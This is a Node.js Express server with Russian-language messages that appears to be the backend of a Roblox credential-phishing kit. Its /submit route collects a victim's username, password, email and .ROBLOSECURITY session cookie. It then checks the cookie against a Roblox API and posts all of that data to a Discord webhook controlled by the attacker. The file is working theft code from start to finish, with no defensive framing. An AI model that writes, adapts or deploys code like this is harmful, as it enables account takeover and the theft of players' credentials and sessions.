const express = require('express');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ID/ВАШ_ТОКЕН";

app.use(express.static(__dirname));
app.use(express.json());

app.post('/submit', async (req, res) => {
  const { username, password, email, cookie } = req.body;

  try {
    const robloxRes = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
    });

    if (!robloxRes.ok) {
      return res.send("Неверный Cookie.");
    }

    const data = await robloxRes.json();

    const message = {
      content: `**Roblox Login Info:**\n👤 Username: ${username}\n🔑 Password: ${password}\n📧 Email: ${email}\n🍪 Cookie: ${cookie}\n🧑 Roblox Username: ${data.UserName}\n🆔 Roblox ID: ${data.UserID}`
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });

    res.send("Успешно! Cookie валиден.");
  } catch (error) {
    res.send("Ошибка при проверке Cookie.");
  }
});

app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});
